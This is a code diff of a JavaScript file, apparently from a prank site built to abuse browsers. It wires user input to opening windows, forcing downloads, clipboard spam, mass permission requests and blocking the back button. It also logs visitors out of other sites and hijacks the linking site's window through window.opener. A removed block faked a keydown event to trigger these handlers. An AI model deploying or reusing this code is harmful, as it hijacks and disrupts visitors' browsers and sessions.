@@ -25,16 +25,17 @@ const TICK_LENGTH = 50
 const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
 
 const ART = [
-  
-`┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
+  `
+┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
 ┈┈┈┈╭━━━━━━╮┊☆ ┊┊
 ┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
 ┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
 ┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
 ☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
-┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊`,
-  
-`░░▓▓░░░░░░░░▓▓░░
+┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
+  `,
+  `
+░░▓▓░░░░░░░░▓▓░░
 ░▓▒▒▓░░░░░░▓▒▒▓░
 ░▓▒▒▒▓░░░░▓▒▒▒▓░
 ░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
@@ -46,7 +47,8 @@ const ART = [
 ▓▒░░▒▓▒▒▓▒▒▓▒░░▓
 ░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
 ░░▓▒▒▒▒▒▒▒▒▒▒▓░░
-░░░▓▓▓▓▓▓▓▓▓▓░░░`
+░░░▓▓▓▓▓▓▓▓▓▓░░░
+  `
 ]
 
 const SEARCHES = [
@@ -161,7 +163,7 @@ let numSuperLogoutIframes = 0
 
 /**
  * Is this window a child window? A window is a child window if there exists a
- * parent window (i.e. the window was opened by another window so window.opener
+ * parent window (i.e. the window was opened by another window so `window.opener`
  * is set) *AND* that parent is a window on the same origin (i.e. the window was
  * opened by us, not an external website)
  */
@@ -173,27 +175,130 @@ const isChildWindow = (window.opener && isParentSameOrigin()) ||
  */
 const isParentWindow = !isChildWindow
 
-// Immediately trigger initialization and interactions
-function immediateInitialization() {
-  // Trigger all the initialization functions
-  init()
-  
-  if (isChildWindow) {
-    initChildWindow()
-  } else {
-    initParentWindow()
-  }
+/*
+ * Run this code in all windows, *both* child and parent windows.
+ */
+init()
 
-  // Simulate initial user interaction to trigger additional functionality
-  const fakeEvent = new Event('keydown')
-  fakeEvent.which = 1 // Simulate a click-like event
-  
-  // Trigger user input interceptors
-  document.dispatchEvent(fakeEvent)
+/*
+ * Use `window.opener` to detect if this window was opened by another window, which
+ * will be its parent. The `window.opener` variable is a reference to the parent
+ * window.
+ */
+if (isChildWindow) initChildWindow()
+else initParentWindow()
+
+/**
+ * Initialization code for *both* parent and child windows.
+ */
+function init () {
+  confirmPageUnload()
+
+  interceptUserInput(event => {
+    interactionCount += 1
+
+    // Prevent default behavior (breaks closing window shortcuts)
+    event.preventDefault()
+    event.stopPropagation()
+
+    // 'touchstart' and 'touchend' events are not able to open a new window
+    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
+    // a clever way to exclude touch events.
+    if (event.which !== 0) openWindow()
+
+    startVibrateInterval()
+    enablePictureInPicture()
+    triggerFileDownload()
+
+    focusWindows()
+    copySpamToClipboard()
+    speak()
+    startTheramin()
+
+    // Capture key presses on the Command or Control keys, to interfere with the
+    // "Close Window" shortcut.
+    if (event.key === 'Meta' || event.key === 'Control') {
+      window.print()
+      requestWebauthnAttestation()
+      window.print()
+      requestWebauthnAttestation()
+      window.print()
+      requestWebauthnAttestation()
+    } else {
+      requestPointerLock()
+
+      requestFullscreen()
+      requestClipboardRead()
+      requestMidiAccess()
+      requestBluetoothAccess()
+      requestUsbAccess()
+      requestSerialAccess()
+      requestHidAccess()
+      requestCameraAndMic()
+      if (Math.random() < 0.1) {
+        // Don't request TouchID on every interaction in Safari since it blocks
+        // the event loop and stops windows from moving
+        requestWebauthnAttestation()
+      }
+    }
+  })
 }
 
-// Run initialization immediately when the script loads
-immediateInitialization()
+/**
+ * Initialization code for child windows.
+ */
+function initChildWindow () {
+  registerProtocolHandlers()
+  hideCursor()
+  moveWindowBounce()
+  setupFollowWindow()
+  startVideo()
+  detectWindowClose()
+  triggerFileDownload()
+  speak()
+  rainbowThemeColor()
+  animateUrlWithEmojis()
+
+  interceptUserInput(event => {
+    if (interactionCount === 1) {
+      startAlertInterval()
+    }
+  })
+}
+
+/**
+ * Initialization code for parent windows.
+ */
+function initParentWindow () {
+  showHelloMessage()
+  blockBackButton()
+  fillHistory()
+  startInvisiblePictureInPictureVideo()
+
+  interceptUserInput(event => {
+    // Only run these on the first interaction
+    if (interactionCount === 1) {
+      registerProtocolHandlers()
+      attemptToTakeoverReferrerWindow()
+      hideCursor()
+      startVideo()
+      startAlertInterval()
+      superLogout()
+      removeHelloMessage()
+      rainbowThemeColor()
+      animateUrlWithEmojis()
+      speak('That was a mistake')
+    }
+  })
+}
+
+/**
+ * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
+ * link in a new window. For example, Messenger.com from Facebook does this.
+ * However, that means that `window.opener` will be set, which allows us to redirect
+ * that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
+ * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
+ */
 function attemptToTakeoverReferrerWindow () {
   if (isParentWindow && window.opener && !isParentSameOrigin()) {
     window.opener.location = `${window.location.origin}/?child=true`
